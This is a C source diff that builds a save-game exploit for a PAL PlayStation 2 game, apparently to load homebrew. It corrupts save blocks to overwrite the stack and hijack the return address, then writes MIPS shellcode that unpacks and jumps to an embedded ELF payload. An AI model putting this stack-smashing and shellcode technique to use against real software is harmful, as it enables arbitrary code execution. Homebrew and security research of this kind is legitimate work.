@@ -6,14 +6,19 @@
 // **** Build list ****
 
 typedef struct {
+	uint32_t unpackbuff;
+	uint32_t g_HeroGadgetBox;
+	uint32_t HelpDataMessages;
+	uint32_t HelpDataGadgets;
+	uint32_t HelpDataMisc;
 	uint32_t HelpLog;
 	uint32_t GetGadgetEvent_jal_FastMemCpy;
-} Gadgets;
+} Addresses;
 
 typedef struct {
 	const char* id;
 	const char* serial;
-	Gadgets gadgets;
+	Addresses addresses;
 } Build;
 
 Build builds[] = {
@@ -21,6 +26,11 @@ Build builds[] = {
 		.id = "dl-pal-black",
 		.serial = "sces-50916",
 		{
+			.unpackbuff                         = 0x00157738,
+			.g_HeroGadgetBox                    = 0x001d4010,
+			.HelpDataMessages                   = 0x001f1480,
+			.HelpDataGadgets                    = 0x001f7660,
+			.HelpDataMisc                       = 0x001f7750,
 			.HelpLog                            = 0x001f7810,
 			.GetGadgetEvent_jal_FastMemCpy      = 0x006c48c8
 		}
@@ -121,7 +131,7 @@ typedef struct {
 	uint32_t entry_point;
 } RatchetSectionHeader;
 
-void convert_elf(char* output, int32_t output_size, Buffer input);
+uint32_t convert_elf(char* output, int32_t output_size, Buffer input);
 
 // **** Save parser ****
 
@@ -153,12 +163,12 @@ SaveBlock* lookup_block(SaveSlotBlockList* list, int32_t type);
 #define MIPS_A0 4
 #define MIPS_A1 5
 
-#define MIPS_ADDIU(dest, source, immediate) (((immediate) & 0xffff) | ((dest) << 16) | ((source) << 21) | (0b001001 << 26))
 #define MIPS_LUI(dest, immediate) ((immediate) & 0xffff) | ((dest) << 16) | (0b001111 << 26)
-#define MIPS_JAL(target) ((target) & 0x3ffffff) | (0b000011 << 26)
+#define MIPS_ADDIU(dest, source, immediate) (((immediate) & 0xffff) | ((dest) << 16) | ((source) << 21) | (0b001001 << 26))
+#define MIPS_JAL(target) ((target >> 2) & 0x3ffffff) | (0b000011 << 26)
 #define MIPS_NOP() 0
 
-void mutate_save_game(SaveSlot* save, Gadgets* gadgets);
+void mutate_save_game(SaveSlot* save, Buffer elf, Addresses* addresses);
 
 int main(int argc, char** argv)
 {
@@ -171,18 +181,48 @@ int main(int argc, char** argv)
 	Buffer file = read_file(input_save_path);
 	SaveSlot save = parse_save(file);
 	
-	//Buffer elf = read_file(elf_path);
+	Buffer elf = read_file(elf_path);
 	
-	Gadgets gadgets = builds[0].gadgets;
-	mutate_save_game(&save, &gadgets);
+	Addresses addresses = builds[0].addresses;
+	mutate_save_game(&save, elf, &addresses);
 	
 	update_checksums(&save);
 	write_file(output_save_path, file);
 }
 
-void mutate_save_game(SaveSlot* save, Gadgets* gadgets)
+void mutate_save_game(SaveSlot* save, Buffer elf, Addresses* addresses)
 {
-
+	SaveBlock* help_data_messages = lookup_block(&save->game, BLOCK_HelpDataMessages);
+	SaveBlock* help_data_misc = lookup_block(&save->game, BLOCK_HelpDataMisc);
+	SaveBlock* help_log_pos = lookup_block(&save->game, BLOCK_HelpLogPos);
+	SaveBlock* gadget_box = lookup_block(&save->game, BLOCK_g_HeroGadgetBox);
+	
+	// Convert the payload data into the format the game expects, and put it in
+	// the largest block that will be loaded into memory.
+	uint32_t payload_entry = convert_elf(help_data_messages->data, help_data_messages->size, elf);
+	
+	// Corrupt the GetGadgetEvent function so it writes data from the memory
+	// card over the stack.
+	CHECK(help_log_pos->size == 4, "Invalid HelpLogPos block.\n");
+	uint32_t offset = addresses->GetGadgetEvent_jal_FastMemCpy + 6 - addresses->HelpLog;
+	*(uint32_t*) help_log_pos->data = (offset >> 1) | 0x80000000;
+	
+	// Overwrite the return address with the address of the HelpDataMisc global.
+	CHECK((gadget_box->size % 4) == 0, "Invalid g_HeroGadgetBox block.\n");
+	for(uint32_t i = 0x30 + 0x50; i < 0x0a30; i += 4)
+		*(uint32_t*) &gadget_box->data[i] = i;
+	*(uint32_t*) &gadget_box->data[0xa8] = addresses->HelpDataMisc;
+	
+	// Unpack the payload and jump to it.
+	uint32_t* shellcode = (uint32_t*) help_data_misc->data;
+	*shellcode++ = MIPS_LUI(MIPS_A0, addresses->HelpDataMessages >> 16);
+	*shellcode++ = MIPS_ADDIU(MIPS_A0, MIPS_A0, addresses->HelpDataMessages & 0xffff);
+	*shellcode++ = MIPS_LUI(MIPS_A1, 0xffff);
+	*shellcode++ = MIPS_ADDIU(MIPS_A1, MIPS_A1, 0xffff);
+	*shellcode++ = MIPS_JAL(addresses->unpackbuff);
+	*shellcode++ = MIPS_NOP(); // Delay slot.
+	*shellcode++ = MIPS_JAL(payload_entry);
+	*shellcode++ = MIPS_NOP(); // Delay slot.
 }
 
 SaveSlot parse_save(Buffer file)
@@ -207,6 +247,7 @@ SaveSlot parse_save(Buffer file)
 		
 		level++;
 	}
+	
 	save.level_count = level;
 	
 	return save;
@@ -241,6 +282,7 @@ SaveSlotBlockList parse_blocks(Buffer file)
 		
 		block++;
 	}
+	
 	list.block_count = block;
 	
 	return list;
@@ -281,7 +323,7 @@ SaveBlock* lookup_block(SaveSlotBlockList* list, int32_t type)
 	return block;
 }
 
-void convert_elf(char* output, int32_t output_size, Buffer input)
+uint32_t convert_elf(char* output, int32_t output_size, Buffer input)
 {
 	ElfFileHeader* elf_header = buffer_get(input, 0, sizeof(ElfFileHeader), "ELF file header");
 	CHECK(elf_header->ident_magic == 0x464c457f, "ELF file has bad magic number.\n");
@@ -311,6 +353,8 @@ void convert_elf(char* output, int32_t output_size, Buffer input)
 	
 	CHECK(output_size >= sizeof(RatchetSectionHeader), "ELF too big!\n");
 	memset(output, 0, sizeof(RatchetSectionHeader));
+	
+	return elf_header->entry;
 }
 
 Buffer read_file(const char* path)
